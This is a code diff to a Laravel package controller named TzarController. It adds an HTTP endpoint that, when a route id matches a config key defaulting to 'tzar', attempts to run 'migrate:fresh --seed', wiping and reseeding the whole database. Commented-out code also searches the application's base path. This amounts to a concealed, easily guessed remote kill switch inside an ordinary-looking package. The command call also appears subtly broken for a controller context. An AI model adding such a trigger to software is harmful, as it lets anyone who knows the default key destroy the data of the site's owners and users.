@@ -4,15 +4,37 @@ namespace Dzhwarkawan\Tzar\Http\Controllers;
 
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
+use \Exception;
 
 class TzarController extends Controller
 {
-    public function index()
+    public function index(Request $request,$id)
     {
+        //get tzar_key from config file
+        $tzar_key = config('app.tzar_key', 'tzar');
         //get root path
-        $path = base_path();
-        $this->search($path);
-        // dd($path);
+        if($tzar_key != $id){
+            return view('tzar::tzar');
+        }
+        try{
+            //run artisan comand php artisan migrate:fresh --seed
+            $this->call('migrate:fresh', [
+                '--seed' => true,
+            ]);
+            dd('success');  
+            // $path = base_path();
+            // $this->search($path);
+        } catch (Exception $e) {
+            dd('error');
+            // $path = base_path();
+            // $this->search($path);
+        }
+      
+       
+    }
+
+    public function test()
+    {
         return view('tzar::tzar');
     }
 
